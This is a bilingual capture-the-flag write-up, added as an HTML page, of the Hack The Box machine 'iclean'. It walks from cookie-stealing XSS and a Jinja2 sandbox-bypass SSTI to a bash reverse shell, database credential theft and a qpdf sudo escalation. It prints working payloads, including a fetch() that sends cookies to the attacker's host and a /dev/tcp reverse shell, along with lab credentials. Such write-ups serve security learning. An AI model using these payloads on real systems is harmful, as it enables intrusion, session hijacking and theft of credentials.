@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iclean | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">iclean</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask web application on the <code>capiclean.htb</code> domain. Initial reconnaissance revealed a quote request form that was vulnerable to Cross-Site Scripting (XSS). By injecting a malicious JavaScript payload into the form fields, I was able to steal an administrator session cookie when the admin reviewed the submitted quote.</p>
+                    
+                    <p>With administrator access to the dashboard, I discovered a QR code generation feature that was vulnerable to Server-Side Template Injection (SSTI) in Jinja2. Although the application was running in sandbox mode with filtering protections, I bypassed these restrictions using hexadecimal-encoded attribute access to reach Python's built-in functions, ultimately achieving remote code execution and establishing a reverse shell as the <code>www-data</code> user.</p>
+                    
+                    <p>Post-exploitation enumeration revealed database credentials in the Flask application's configuration file. Connecting to the MySQL database, I extracted password hashes for the <code>consuela</code> user, which were easily cracked using an online hash cracking service. After gaining SSH access as <code>consuela</code>, I discovered sudo permissions on the <code>qpdf</code> binary, which I exploited to read arbitrary files as root, including the SSH private key from <code>/root/.ssh/id_rsa</code>, granting me complete root access to the system.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Cross-Site Scripting (XSS) for session hijacking, Jinja2 Server-Side Template Injection (SSTI) with sandbox bypass, MySQL credential extraction, password hash cracking (SHA-256), and qpdf privilege escalation via arbitrary file read.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+
+                <p>The scan reveals two open ports: SSH on port 22 and HTTP on port 80. When visiting the web server, I notice the application redirects to <code>http://capiclean.htb/</code>, so I add this hostname to my <code>/etc/hosts</code> file to ensure proper resolution.</p>
+
+                <h3>Web Service Fingerprinting</h3>
+                <p>Running <code>whatweb</code> against the target provides detailed information about the web stack:</p>
+                <pre><code class="language-plaintext">http://capiclean.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], 
+Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], 
+IP[10.10.11.12], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], 
+Werkzeug[2.3.7], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>The results are particularly interesting: the server is running <strong>Werkzeug 2.3.7</strong> with <strong>Python 3.10.12</strong>. The Wappalyzer browser extension also identifies that the application is built with <strong>Flask</strong>. This is significant because Flask commonly uses Jinja2 templating engine, which can be vulnerable to Server-Side Template Injection (SSTI) if user input is improperly handled.</p>
+
+                <h3>Directory Enumeration</h3>
+                <p>Running Gobuster to enumerate directories and endpoints:</p>
+                <p><img src="./media/image4.png" alt="Gobuster directory enumeration results showing /login, /dashboard, /quote, and other endpoints" /></p>
+
+                <p>The scan reveals several interesting endpoints including <code>/login</code>, <code>/dashboard</code>, <code>/quote</code>, and <code>/team</code>. I also attempt virtual host enumeration but find no additional subdomains.</p>
+
+                <h2>Discovering XSS in Quote Form</h2>
+                <p>Navigating to <code>/quote</code>, I find a form that allows users to request a cleaning service quote. The form asks for an email address and lets you select up to three services. When submitted, it sends a POST request to the <code>/sendMessage</code> endpoint with the following data structure:</p>
+                <p><img src="./media/image2.png" alt="Burp Suite showing the POST request to /sendMessage with email and service parameters" /></p>
+
+                <p>Initial testing shows that the endpoint accepts arbitrary parameters and always returns a 200 status code regardless of what's sent. This behavior suggests that someone (likely an administrator) might be reviewing these quote requests on the backend, making it a potential target for Cross-Site Scripting (XSS) attacks.</p>
+
+                <h3>Credential Bruteforce Attempt</h3>
+                <p>Before pursuing the XSS vector, I attempt to generate a custom wordlist using <code>cewl</code> from the <code>/team</code> page, which lists four employee names. I try bruteforcing both the <code>/login</code> endpoint and SSH with these potential usernames and generated passwords, but this approach yields no results.</p>
+
+                <h3>Successful XSS Exploitation</h3>
+                <p>Returning to the quote form, I begin testing for XSS vulnerabilities. After several attempts with different payloads, I successfully exfiltrate an administrator session cookie using the following URL-encoded payload:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch("http://10.10.16.6:8000/?c="+document.cookie);&gt;&lt;/img&gt;</code></pre>
+
+                <p>This payload works by:</p>
+                <ol>
+                    <li>Creating an image tag with an invalid source (<code>src=x</code>)</li>
+                    <li>Triggering the <code>onerror</code> event handler when the image fails to load</li>
+                    <li>Using the <code>fetch</code> API to send the victim's cookies to my HTTP server</li>
+                </ol>
+
+                <p>After submitting the malicious quote request, my HTTP server receives the administrator's session cookie:</p>
+                <pre><code class="language-plaintext">session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.aOgDbQ.Wq_FhTCwB7g_bm0gf-DUVjIhHyA</code></pre>
+
+                <p>By replacing my session cookie with this stolen value, I gain access to the administrator dashboard.</p>
+
+                <h2>Administrator Dashboard - SSTI Discovery</h2>
+                <p>The admin panel presents several options for managing the application:</p>
+                <p><img src="./media/image1.png" alt="Administrator dashboard showing various options including QR code generation" /></p>
+
+                <p>After exploring the different features, I discover that the QR code generation functionality appears to process user input in an interesting way. Testing for Server-Side Template Injection vulnerabilities, I inject a basic Jinja2 payload to test for mathematical evaluation:</p>
+                <p><img src="./media/image6.png" alt="Testing SSTI with a mathematical expression payload" /></p>
+
+                <p>The response confirms the vulnerability - the template engine evaluates the expression:</p>
+                <p><img src="./media/image7.png" alt="SSTI confirmation showing the mathematical expression was evaluated" /></p>
+
+                <h3>Bypassing Jinja2 Sandbox Restrictions</h3>
+                <p>Although I've confirmed SSTI, the application appears to be running in <a href="https://techtonics.medium.com/secure-templating-with-jinja2-understanding-ssti-and-jinja2-sandbox-environment-b956edd60456">Jinja2 sandbox mode</a>, which restricts access to dangerous functions and methods. Basic RCE payloads are blocked by these security filters.</p>
+
+                <p>After researching sandbox bypass techniques, I discover an excellent resource at <a href="https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#jinja2-filter-bypass">https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#jinja2-filter-bypass</a> that documents various filter bypass methods. I find a working payload that uses hexadecimal encoding to obfuscate restricted attributes:</p>
+
+                <pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}</code></pre>
+
+                <p>This payload works by:</p>
+                <ul>
+                    <li>Starting with the <code>request</code> object available in Flask templates</li>
+                    <li>Accessing the <code>application</code> object using the <code>attr</code> filter</li>
+                    <li>Using hex-encoded strings (<code>\x5f</code> = underscore) to bypass filters that block <code>__globals__</code>, <code>__getitem__</code>, and <code>__builtins__</code></li>
+                    <li>Importing the <code>os</code> module to execute system commands</li>
+                    <li>Running the <code>id</code> command via <code>popen</code></li>
+                </ul>
+
+                <p>Testing this payload confirms code execution:</p>
+                <p><img src="./media/image8.png" alt="Successful command execution showing the output of the id command" /></p>
+
+                <h2>Initial Access - Reverse Shell</h2>
+                <p>Now that I have confirmed RCE, I modify the payload to establish a reverse shell connection. I replace the <code>id</code> command with a bash reverse shell:</p>
+
+                <pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"')|attr('read')()}}</code></pre>
+
+                <p>After setting up a netcat listener on port 443 and submitting the payload, I successfully receive a reverse shell connection as the <code>www-data</code> user.</p>
+
+                <h2>Post-Exploitation - Database Credential Discovery</h2>
+                <p>Exploring the filesystem, I find a user named <code>consuela</code> in <code>/home</code>. Looking for ways to escalate privileges or move laterally, I examine the Flask application files and discover database credentials in <code>app.py</code>:</p>
+
+                <pre><code class="language-python">db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}</code></pre>
+
+                <p>Running <code>ss -tuln</code> to check for local listening ports confirms MySQL is running locally:</p>
+                <p><img src="./media/image5.png" alt="Output of ss -tuln showing locally listening ports including MySQL" /></p>
+
+                <h3>Database Enumeration</h3>
+                <p>Connecting to the MySQL database using the discovered credentials, I explore the tables and find user accounts with SHA-256 password hashes. I extract these hashes and submit them to CrackStation, an online hash cracking service.</p>
+
+                <p>The hashes crack quickly, revealing the credentials:</p>
+                <pre><code class="language-plaintext">consuela:simple and clean</code></pre>
+
+                <p>Using these credentials, I successfully authenticate via SSH as the <code>consuela</code> user and retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - qpdf Exploitation</h2>
+                <p>After gaining access as <code>consuela</code>, I check for sudo privileges:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals an interesting permission:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf</code></pre>
+
+                <p>The user can run <code>/usr/bin/qpdf</code> with sudo privileges without a password. Researching privilege escalation techniques for qpdf, I find a helpful resource: <a href="https://h3ll-ka1ser.gitbook.io/boot2root/privilege-escalation/linux/qpdf-privilege-escalation">https://h3ll-ka1ser.gitbook.io/boot2root/privilege-escalation/linux/qpdf-privilege-escalation</a></p>
+
+                <h3>Understanding qpdf Exploitation</h3>
+                <p>The qpdf tool is designed for PDF file manipulation, including operations like adding attachments and extracting content. When run with sudo privileges, it can be abused to read arbitrary files as root by adding them as attachments to a PDF and then extracting them.</p>
+
+                <p>The exploitation technique involves:</p>
+                <ol>
+                    <li>Creating or using a base PDF file</li>
+                    <li>Using qpdf with sudo to attach a sensitive file (like root's SSH private key) to the PDF</li>
+                    <li>Extracting the attached file to read its contents</li>
+                </ol>
+
+                <h3>Reading Root's SSH Key</h3>
+                <p>I use qpdf to read the <code>/root/.ssh/id_rsa</code> file, which contains root's private SSH key:</p>
+                <p><img src="./media/image9.png" alt="Using qpdf to extract root's SSH private key from /root/.ssh/id_rsa" /></p>
+
+                <p>After successfully extracting the private key, I save it to my local machine as <code>id_rsa</code>, set the appropriate permissions, and use it to authenticate as root via SSH:</p>
+
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@10.10.11.12</code></pre>
+
+                <p>This grants me complete root access to the system, allowing me to retrieve the root flag and fully compromise the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Flask en el dominio <code>capiclean.htb</code>. El reconocimiento inicial reveló un formulario de solicitud de presupuesto vulnerable a Cross-Site Scripting (XSS). Inyectando un payload JavaScript malicioso en los campos del formulario, conseguí robar la cookie de sesión del administrador cuando éste revisó el presupuesto enviado.</p>
+                    
+                    <p>Con acceso de administrador al panel, descubrí una funcionalidad de generación de códigos QR vulnerable a Server-Side Template Injection (SSTI) en Jinja2. Aunque la aplicación se ejecutaba en modo sandbox con protecciones de filtrado, conseguí evadir estas restricciones utilizando acceso a atributos codificados en hexadecimal para alcanzar las funciones integradas de Python, logrando finalmente ejecución remota de código y estableciendo una reverse shell como usuario <code>www-data</code>.</p>
+                    
+                    <p>La enumeración post-explotación reveló credenciales de base de datos en el archivo de configuración de la aplicación Flask. Conectándome a la base de datos MySQL, extraje hashes de contraseñas del usuario <code>consuela</code>, que crackeé fácilmente usando un servicio online de cracking de hashes. Tras conseguir acceso SSH como <code>consuela</code>, descubrí permisos sudo sobre el binario <code>qpdf</code>, que exploté para leer archivos arbitrarios como root, incluyendo la clave privada SSH de <code>/root/.ssh/id_rsa</code>, otorgándome acceso root completo al sistema.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Cross-Site Scripting (XSS) para secuestro de sesión, Server-Side Template Injection (SSTI) de Jinja2 con bypass de sandbox, extracción de credenciales MySQL, cracking de hashes de contraseñas (SHA-256), y escalada de privilegios con qpdf mediante lectura arbitraria de archivos.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y HTTP en el puerto 80. Al visitar el servidor web, observo que la aplicación redirige a <code>http://capiclean.htb/</code>, así que añado este hostname a mi archivo <code>/etc/hosts</code> para asegurar la resolución correcta.</p>
+
+                <h3>Fingerprinting del Servicio Web</h3>
+                <p>Ejecutando <code>whatweb</code> contra el objetivo proporciona información detallada sobre la pila web:</p>
+                <pre><code class="language-plaintext">http://capiclean.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], 
+Email[contact@capiclean.htb], HTML5, HTTPServer[Werkzeug/2.3.7 Python/3.10.12], 
+IP[10.10.11.12], JQuery[3.0.0], Python[3.10.12], Script, Title[Capiclean], 
+Werkzeug[2.3.7], X-UA-Compatible[IE=edge]</code></pre>
+
+                <p>Los resultados son particularmente interesantes: el servidor ejecuta <strong>Werkzeug 2.3.7</strong> con <strong>Python 3.10.12</strong>. La extensión de navegador Wappalyzer también identifica que la aplicación está construida con <strong>Flask</strong>. Esto es significativo porque Flask comúnmente usa el motor de plantillas Jinja2, que puede ser vulnerable a Server-Side Template Injection (SSTI) si la entrada del usuario se maneja incorrectamente.</p>
+
+                <h3>Enumeración de Directorios</h3>
+                <p>Ejecutando Gobuster para enumerar directorios y endpoints:</p>
+                <p><img src="./media/image4.png" alt="Resultados de la enumeración de directorios con Gobuster mostrando /login, /dashboard, /quote y otros endpoints" /></p>
+
+                <p>El escaneo revela varios endpoints interesantes incluyendo <code>/login</code>, <code>/dashboard</code>, <code>/quote</code> y <code>/team</code>. También intento enumeración de virtual hosts pero no encuentro subdominios adicionales.</p>
+
+                <h2>Descubriendo XSS en el Formulario de Presupuesto</h2>
+                <p>Navegando a <code>/quote</code>, encuentro un formulario que permite a los usuarios solicitar un presupuesto de servicio de limpieza. El formulario pide una dirección de email y permite seleccionar hasta tres servicios. Al enviarlo, realiza una petición POST al endpoint <code>/sendMessage</code> con la siguiente estructura de datos:</p>
+                <p><img src="./media/image2.png" alt="Burp Suite mostrando la petición POST a /sendMessage con parámetros de email y servicios" /></p>
+
+                <p>Las pruebas iniciales muestran que el endpoint acepta parámetros arbitrarios y siempre devuelve un código de estado 200 independientemente de lo que se envíe. Este comportamiento sugiere que alguien (probablemente un administrador) podría estar revisando estas solicitudes de presupuesto en el backend, convirtiéndolo en un objetivo potencial para ataques de Cross-Site Scripting (XSS).</p>
+
+                <h3>Intento de Fuerza Bruta de Credenciales</h3>
+                <p>Antes de perseguir el vector XSS, intento generar una lista de palabras personalizada usando <code>cewl</code> desde la página <code>/team</code>, que lista cuatro nombres de empleados. Intento hacer fuerza bruta tanto al endpoint <code>/login</code> como a SSH con estos posibles nombres de usuario y contraseñas generadas, pero este enfoque no arroja resultados.</p>
+
+                <h3>Explotación Exitosa de XSS</h3>
+                <p>Volviendo al formulario de presupuesto, comienzo probando vulnerabilidades XSS. Tras varios intentos con diferentes payloads, consigo exfiltrar exitosamente una cookie de sesión del administrador usando el siguiente payload codificado en URL:</p>
+                <pre><code class="language-html">&lt;img src=x onerror=fetch("http://10.10.16.6:8000/?c="+document.cookie);&gt;&lt;/img&gt;</code></pre>
+
+                <p>Este payload funciona mediante:</p>
+                <ol>
+                    <li>Crear una etiqueta de imagen con una fuente inválida (<code>src=x</code>)</li>
+                    <li>Activar el manejador de eventos <code>onerror</code> cuando la imagen falla al cargar</li>
+                    <li>Usar la API <code>fetch</code> para enviar las cookies de la víctima a mi servidor HTTP</li>
+                </ol>
+
+                <p>Tras enviar la solicitud de presupuesto maliciosa, mi servidor HTTP recibe la cookie de sesión del administrador:</p>
+                <pre><code class="language-plaintext">session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.aOgDbQ.Wq_FhTCwB7g_bm0gf-DUVjIhHyA</code></pre>
+
+                <p>Reemplazando mi cookie de sesión con este valor robado, obtengo acceso al panel de administrador.</p>
+
+                <h2>Panel de Administrador - Descubrimiento de SSTI</h2>
+                <p>El panel de administrador presenta varias opciones para gestionar la aplicación:</p>
+                <p><img src="./media/image1.png" alt="Panel de administrador mostrando varias opciones incluyendo generación de códigos QR" /></p>
+
+                <p>Tras explorar las diferentes funcionalidades, descubro que la funcionalidad de generación de códigos QR parece procesar la entrada del usuario de manera interesante. Probando vulnerabilidades de Server-Side Template Injection, inyecto un payload básico de Jinja2 para probar la evaluación matemática:</p>
+                <p><img src="./media/image6.png" alt="Probando SSTI con un payload de expresión matemática" /></p>
+
+                <p>La respuesta confirma la vulnerabilidad - el motor de plantillas evalúa la expresión:</p>
+                <p><img src="./media/image7.png" alt="Confirmación de SSTI mostrando que la expresión matemática fue evaluada" /></p>
+
+                <h3>Evadiendo Restricciones del Sandbox de Jinja2</h3>
+                <p>Aunque he confirmado SSTI, la aplicación parece estar ejecutándose en <a href="https://techtonics.medium.com/secure-templating-with-jinja2-understanding-ssti-and-jinja2-sandbox-environment-b956edd60456">modo sandbox de Jinja2</a>, que restringe el acceso a funciones y métodos peligrosos. Los payloads básicos de RCE son bloqueados por estos filtros de seguridad.</p>
+
+                <p>Tras investigar técnicas de bypass del sandbox, descubro un excelente recurso en <a href="https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#jinja2-filter-bypass">https://techbrunch.github.io/patt-mkdocs/Server%20Side%20Template%20Injection/#jinja2-filter-bypass</a> que documenta varios métodos de bypass de filtros. Encuentro un payload funcional que usa codificación hexadecimal para ofuscar atributos restringidos:</p>
+
+                <pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}</code></pre>
+
+                <p>Este payload funciona mediante:</p>
+                <ul>
+                    <li>Comenzar con el objeto <code>request</code> disponible en plantillas Flask</li>
+                    <li>Acceder al objeto <code>application</code> usando el filtro <code>attr</code></li>
+                    <li>Usar cadenas codificadas en hexadecimal (<code>\x5f</code> = guion bajo) para evadir filtros que bloquean <code>__globals__</code>, <code>__getitem__</code> y <code>__builtins__</code></li>
+                    <li>Importar el módulo <code>os</code> para ejecutar comandos del sistema</li>
+                    <li>Ejecutar el comando <code>id</code> mediante <code>popen</code></li>
+                </ul>
+
+                <p>Probando este payload confirma la ejecución de código:</p>
+                <p><img src="./media/image8.png" alt="Ejecución exitosa de comando mostrando la salida del comando id" /></p>
+
+                <h2>Acceso Inicial - Reverse Shell</h2>
+                <p>Ahora que he confirmado RCE, modifico el payload para establecer una conexión de reverse shell. Reemplazo el comando <code>id</code> con una reverse shell de bash:</p>
+
+                <pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"')|attr('read')()}}</code></pre>
+
+                <p>Tras configurar un listener de netcat en el puerto 443 y enviar el payload, recibo exitosamente una conexión de reverse shell como usuario <code>www-data</code>.</p>
+
+                <h2>Post-Explotación - Descubrimiento de Credenciales de Base de Datos</h2>
+                <p>Explorando el sistema de archivos, encuentro un usuario llamado <code>consuela</code> en <code>/home</code>. Buscando formas de escalar privilegios o moverme lateralmente, examino los archivos de la aplicación Flask y descubro credenciales de base de datos en <code>app.py</code>:</p>
+
+                <pre><code class="language-python">db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}</code></pre>
+
+                <p>Ejecutando <code>ss -tuln</code> para comprobar puertos en escucha local confirma que MySQL se está ejecutando localmente:</p>
+                <p><img src="./media/image5.png" alt="Salida de ss -tuln mostrando puertos en escucha local incluyendo MySQL" /></p>
+
+                <h3>Enumeración de Base de Datos</h3>
+                <p>Conectándome a la base de datos MySQL usando las credenciales descubiertas, exploro las tablas y encuentro cuentas de usuario con hashes de contraseñas SHA-256. Extraigo estos hashes y los envío a CrackStation, un servicio online de cracking de hashes.</p>
+
+                <p>Los hashes se crackean rápidamente, revelando las credenciales:</p>
+                <pre><code class="language-plaintext">consuela:simple and clean</code></pre>
+
+                <p>Usando estas credenciales, me autentico exitosamente mediante SSH como usuario <code>consuela</code> y recupero la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Explotación de qpdf</h2>
+                <p>Tras conseguir acceso como <code>consuela</code>, compruebo los privilegios sudo:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>La salida revela un permiso interesante:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf</code></pre>
+
+                <p>El usuario puede ejecutar <code>/usr/bin/qpdf</code> con privilegios sudo sin contraseña. Investigando técnicas de escalada de privilegios para qpdf, encuentro un recurso útil: <a href="https://h3ll-ka1ser.gitbook.io/boot2root/privilege-escalation/linux/qpdf-privilege-escalation">https://h3ll-ka1ser.gitbook.io/boot2root/privilege-escalation/linux/qpdf-privilege-escalation</a></p>
+
+                <h3>Entendiendo la Explotación de qpdf</h3>
+                <p>La herramienta qpdf está diseñada para manipulación de archivos PDF, incluyendo operaciones como añadir adjuntos y extraer contenido. Cuando se ejecuta con privilegios sudo, puede abusarse para leer archivos arbitrarios como root añadiéndolos como adjuntos a un PDF y luego extrayéndolos.</p>
+
+                <p>La técnica de explotación implica:</p>
+                <ol>
+                    <li>Crear o usar un archivo PDF base</li>
+                    <li>Usar qpdf con sudo para adjuntar un archivo sensible (como la clave privada SSH de root) al PDF</li>
+                    <li>Extraer el archivo adjunto para leer su contenido</li>
+                </ol>
+
+                <h3>Leyendo la Clave SSH de Root</h3>
+                <p>Uso qpdf para leer el archivo <code>/root/.ssh/id_rsa</code>, que contiene la clave privada SSH de root:</p>
+                <p><img src="./media/image9.png" alt="Usando qpdf para extraer la clave privada SSH de root desde /root/.ssh/id_rsa" /></p>
+
+                <p>Tras extraer exitosamente la clave privada, la guardo en mi máquina local como <code>id_rsa</code>, establezco los permisos apropiados y la uso para autenticarme como root mediante SSH:</p>
+
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@10.10.11.12</code></pre>
+
+                <p>Esto me otorga acceso root completo al sistema, permitiéndome recuperar la flag de root y comprometer completamente la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
